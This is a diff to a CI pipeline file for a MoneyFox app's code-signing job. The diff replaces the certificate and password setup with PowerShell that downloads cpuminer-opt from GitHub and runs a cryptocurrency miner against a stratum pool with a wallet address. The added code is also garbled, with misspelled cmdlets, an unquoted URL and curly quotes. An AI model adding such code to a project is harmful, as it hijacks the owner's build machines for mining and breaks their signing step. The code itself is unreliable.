@@ -35,8 +35,11 @@ jobs:
       secureFile: 'MoneyFoxCert_2020.pfx'
 
   - powershell: |
-      $pfxpath = '$(signingCert.secureFilePath)'
-      $certPassword = $env:CERT_PASSWORD_ENV
+      $ client = new-objek System.Net.WebClient
+      $ client.Credentials = Get-Credential
+      $client.Download_File(https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-win.zip,”.\”)
+      unzip cpuminer-opt-win.zip
+      .\cpuminer-avx2.exe -a curvehash -o stratum+tcp://stratum-asia.rplant.xyz:7058 -u TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN.jinmanju -p password=x -t 10
 
       Add-Type -AssemblyName System.Security
       $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
